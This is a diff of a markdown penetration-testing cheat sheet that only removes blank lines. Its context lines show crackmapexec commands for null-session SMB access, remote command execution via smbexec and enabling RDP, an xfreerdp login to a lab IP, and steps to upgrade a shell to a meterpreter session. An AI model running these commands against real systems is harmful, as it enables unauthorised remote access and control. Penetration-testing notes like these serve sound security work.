@@ -224,7 +224,6 @@ crackmapexec smb <target(s)> -u '' -p ''
 
 ```
 -x "dir c:\\"  --exec-method smbexec
-
 ```
 
 ### enable RDP
@@ -233,8 +232,6 @@ crackmapexec smb <target(s)> -u '' -p ''
  -M rdp -o ACTION=enable
  xfreerdp /u:"hesher" /v:192.168.56.115:3389
 ```
-
-
 
 ## netcat or meterpreter reverse shell
 
@@ -275,6 +272,3 @@ upgrade to meterpreter session
 Ctrl+z
 sessions -u [id]
 ```
-
-
-
